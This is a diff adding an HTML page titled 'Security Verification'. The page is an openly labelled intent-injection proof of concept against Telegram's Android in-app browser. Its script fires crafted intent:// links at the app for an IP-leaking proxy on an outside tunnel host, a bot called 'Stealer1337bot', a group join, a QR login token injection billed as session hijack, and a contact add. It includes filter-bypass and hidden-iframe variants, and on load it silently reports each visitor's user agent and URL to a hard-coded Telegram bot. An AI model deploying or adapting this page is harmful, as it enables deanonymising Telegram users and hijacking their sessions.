@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Security Verification</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: -apple-system, system-ui, sans-serif; background: #f5f5f5; padding: 16px; }
+    .card {
+      max-width: 420px; margin: 20px auto; background: #fff;
+      border-radius: 12px; padding: 20px; box-shadow: 0 1px 6px rgba(0,0,0,.08);
+    }
+    h2 { font-size: 18px; margin-bottom: 12px; color: #222; }
+    p { color: #666; font-size: 13px; margin-bottom: 16px; line-height: 1.4; }
+    .tests { display: flex; flex-direction: column; gap: 8px; }
+    .btn {
+      display: block; text-align: center; background: #2AABEE; color: #fff;
+      text-decoration: none; padding: 12px; border-radius: 8px;
+      font-size: 14px; font-weight: 600; border: none; cursor: pointer;
+    }
+    .btn.red { background: #e53935; }
+    .btn.orange { background: #f57c00; }
+    .btn.green { background: #43a047; }
+    .btn.purple { background: #8e24aa; }
+    #log {
+      margin-top: 16px; background: #1a1a2e; color: #0f0; padding: 12px;
+      border-radius: 8px; font-family: monospace; font-size: 11px;
+      max-height: 300px; overflow-y: auto; white-space: pre-wrap;
+    }
+    .label { font-size: 11px; color: #999; margin-top: 4px; }
+  </style>
+</head>
+<body>
+<div class="card">
+  <h2>Intent Injection PoC</h2>
+  <p>Tests intent:// URI injection via openInExternalApp in Telegram's in-app browser.
+     Each button crafts an intent:// URI targeting LaunchActivity with a different tg:// deep link.</p>
+  <div class="tests">
+
+    <!-- Test 1: Proxy IP Leak (auto-connects, leaks real IP) -->
+    <button class="btn red" onclick="fire('proxy')">
+      Test 1: tg://proxy (IP Leak)
+    </button>
+    <div class="label">intent:// → tg://proxy?server=attacker&port=9090 — forces proxy connectivity check</div>
+
+    <!-- Test 2: Force open bot / Mini App -->
+    <button class="btn orange" onclick="fire('resolve')">
+      Test 2: tg://resolve (Open Bot)
+    </button>
+    <div class="label">intent:// → tg://resolve?domain=Stealer1337bot&startapp=x — forces Mini App open</div>
+
+    <!-- Test 3: Join group via invite -->
+    <button class="btn green" onclick="fire('join')">
+      Test 3: tg://join (Join Group)
+    </button>
+    <div class="label">intent:// → tg://join?invite=AAAAAE... — auto-opens group join dialog</div>
+
+    <!-- Test 4: QR Login Token Injection (session hijack) -->
+    <button class="btn purple" onclick="fire('login')">
+      Test 4: tg://login (Session Hijack)
+    </button>
+    <div class="label">intent:// → tg://login?token=... — injects QR login token into handleIntent</div>
+
+    <!-- Test 5: Add contact -->
+    <button class="btn" onclick="fire('contact')">
+      Test 5: tg://addcontact
+    </button>
+    <div class="label">intent:// → tg://addcontact?phone=... — forces contact add dialog</div>
+
+    <!-- Auto-fire test (for 1-click chain) -->
+    <button class="btn red" onclick="autoFire()">
+      AUTO: Chain all tests (2s delay each)
+    </button>
+  </div>
+  <div id="log">Intent Injection PoC loaded.\n</div>
+</div>
+
+<script>
+var BOT_TOKEN = '8637229217:AAHukIDrQ3yHMKakpb4pOhLbb-IpjG_vtCA';
+var CHAT_ID = '1184265321';
+
+function log(msg) {
+  var el = document.getElementById('log');
+  el.textContent += '[' + new Date().toISOString().substr(11,8) + '] ' + msg + '\n';
+  el.scrollTop = el.scrollHeight;
+}
+
+function send(text) {
+  var url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage';
+  fetch(url, {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({chat_id: CHAT_ID, text: text, parse_mode: 'HTML'})
+  }).catch(function(){});
+}
+
+// Craft intent:// URIs for each test
+var payloads = {
+  // Test 1: Proxy - should trigger auto-connect (IP leak) before confirmation
+  proxy: 'intent://proxy?server=brings-popularity-elsewhere-libraries.trycloudflare.com%26port=443%26secret=dd00000000000000000000000000000000#Intent;scheme=tg;action=android.intent.action.VIEW;end',
+
+  // Test 2: Resolve bot - should open our bot's mini app
+  resolve: 'intent://resolve?domain=Stealer1337bot%26startapp=x%26start=auto#Intent;scheme=tg;action=android.intent.action.VIEW;end',
+
+  // Test 3: Join group - AAAAAEX is a dummy invite hash
+  join: 'intent://join?invite=AAAAAEX_test#Intent;scheme=tg;action=android.intent.action.VIEW;end',
+
+  // Test 4: Login token - dummy base64 token (in real attack, this would be attacker's QR token)
+  login: 'intent://login?token=dGVzdF90b2tlbl9mb3JfcG9j#Intent;scheme=tg;action=android.intent.action.VIEW;end',
+
+  // Test 5: Add contact
+  contact: 'intent://addcontact?phone=%2B15551234567%26first_name=Evil%26last_name=Hacker#Intent;scheme=tg;action=android.intent.action.VIEW;end'
+};
+
+// Alternative payloads using component targeting (bypass intent filter matching)
+var payloads_component = {
+  proxy: 'intent://proxy?server=brings-popularity-elsewhere-libraries.trycloudflare.com%26port=443%26secret=dd00000000000000000000000000000000#Intent;scheme=tg;component=org.telegram.messenger.web/org.telegram.ui.LaunchActivity;end',
+  resolve: 'intent://resolve?domain=Stealer1337bot%26startapp=x#Intent;scheme=tg;component=org.telegram.messenger.web/org.telegram.ui.LaunchActivity;end',
+  join: 'intent://join?invite=AAAAAEX_test#Intent;scheme=tg;component=org.telegram.messenger.web/org.telegram.ui.LaunchActivity;end',
+  login: 'intent://login?token=dGVzdF90b2tlbl9mb3JfcG9j#Intent;scheme=tg;component=org.telegram.messenger.web/org.telegram.ui.LaunchActivity;end',
+  contact: 'intent://addcontact?phone=%2B15551234567%26first_name=Evil%26last_name=Hacker#Intent;scheme=tg;component=org.telegram.messenger.web/org.telegram.ui.LaunchActivity;end'
+};
+
+function fire(test) {
+  log('Firing: ' + test);
+  send('Intent inject test: ' + test + '\nPayload: ' + payloads[test]);
+
+  // Try intent filter matching first
+  var url = payloads[test];
+  log('URL: ' + url);
+
+  // Method 1: window.location
+  try {
+    log('Trying window.location...');
+    window.location = url;
+  } catch(e) {
+    log('location failed: ' + e.message);
+  }
+}
+
+function fireComponent(test) {
+  log('Firing (component): ' + test);
+  var url = payloads_component[test];
+  log('URL: ' + url);
+  window.location = url;
+}
+
+function autoFire() {
+  var tests = ['proxy', 'resolve', 'join', 'login', 'contact'];
+  var i = 0;
+  function next() {
+    if (i >= tests.length) {
+      log('All tests fired.');
+      send('All intent injection tests completed.');
+      return;
+    }
+    fire(tests[i]);
+    i++;
+    setTimeout(next, 3000);
+  }
+  next();
+}
+
+// Also try via <a> tag click and iframe
+function fireViaLink(test) {
+  log('Firing via <a> click: ' + test);
+  var a = document.createElement('a');
+  a.href = payloads[test];
+  document.body.appendChild(a);
+  a.click();
+  a.remove();
+}
+
+function fireViaIframe(test) {
+  log('Firing via iframe: ' + test);
+  var iframe = document.createElement('iframe');
+  iframe.style.display = 'none';
+  iframe.src = payloads[test];
+  document.body.appendChild(iframe);
+  setTimeout(function() { iframe.remove(); }, 2000);
+}
+
+log('Ready. Payloads loaded for ' + Object.keys(payloads).length + ' tests.');
+log('In-app browser context: ' + location.protocol + '//' + location.host);
+log('');
+
+// Report that the page loaded
+send('Intent injection PoC loaded in Telegram in-app browser\nUA: ' + navigator.userAgent + '\nURL: ' + location.href);
+</script>
+</body>
+</html>
